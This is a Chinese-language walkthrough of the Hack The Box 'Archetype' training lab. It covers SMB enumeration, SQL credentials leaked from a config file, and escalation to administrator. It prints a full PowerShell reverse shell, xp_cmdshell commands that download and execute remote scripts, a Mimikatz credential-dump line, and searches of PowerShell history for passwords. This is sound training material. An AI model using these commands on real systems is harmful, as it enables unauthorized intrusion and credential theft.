# Hack The Box Archetype测试练习

## nmap端口扫描

```
首先我们获取到了Archetype机器的ip地址，对他进行端口扫描
nmap —sS -sV -T4 10.10.10.27
```

![image-20210919200716104](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210919200716104.png)

```
发现开启了135、139、445、1433端口
```

​	

## smbclient测试445端口

```
smbclient -N -L //10.10.10.27/
N	匿名登录
L	获取共享资源列表
```

![image-20210919202043359](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210919202043359.png)

```
发现备份目录backups
进入备份
smbclient  -N //10.10.10.27/backups
dir
```

![image-20210919202702557](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210919202702557.png)

## 数据库连接

```
发现了一个配置文件prod.dtsConfig
get prod.dtsConfig 下载到本地看看他
```

![image-20210919203256843](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210919203256843.png)

```
可以看到Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
密码M3g4c0rp123
账户ARCHETYPE\sql_svc
mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```

![image-20210919204809087](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210919204809087.png)



## 反向连接shell（PowerShell）



```
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.23",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 使用python建立一个小型网络服务器以托管文件。

```
python3 -m http.server 80
```

![image-20210920110204671](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210920110204671.png)

### NC端口监听

```
nc -nlvp 443
```



### 数据库执行命令

```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.17.182/shell_2021.ps1\");"
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.241.138/shell_2021.ps1\");"
```

### 访问PowerShell历史记录文件

#### Powershell命令的历史记录有时会包含系统敏感信息，例如远程服务器的连接口令等

```

C:\Users\用户名\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt


//powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.182:80/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```

```
通过此命令，我们可以轻松地找到想要的文件
gci c:\ -Include user.txt -File -Recurse -EA SilentlyContinue
```

![image-20210922152128876](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210922152128876.png)

```
看看powershell历史记录里面的文件
找到路径
通过此命令，我们可以根据文件名识别具有潜在敏感数据的文件
gci c:\ -Include *pass*.txt,*user*.txt, -File -Recurse -EA SilentlyContinue


powershell 路径一般不会被修改，可以查到
//powershell gci c:\ -Include ConsoleHost_history.txt -File -Recurse -EA SilentlyContinue
powershell gci c:\ -Include *pass*.txt,*user*.txt,*history*.txt, -File -Recurse -EA SilentlyContinue
得到路径查看
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

登入
psexec.py administrator@10.10.10.27
MEGACORP_4dm1n!!

```

![image-20210922153614929](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210922153614929.png)

## 试试别的东西,可能是我太菜吧

```
本来想用curl上传一些东西的，但是只有txt上传成功，但是过了一会就被清理了
curl http://10.10.17.182/Invoke-Mimikatz.ps1 -o Invoke-Mimikatz.ps1
失败

$client.DownloadFile('http://10.10.17.182/Invoke-Mimikatz.ps1','C:\Users\sql_svc\Invoke-Mimikatz.ps1')
失败
```

![image-20210922161322439](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210922161322439.png)

![image-20210922170557062](http://text-2021.oss-cn-beijing.aliyuncs.com/img/image-20210922170557062.png)
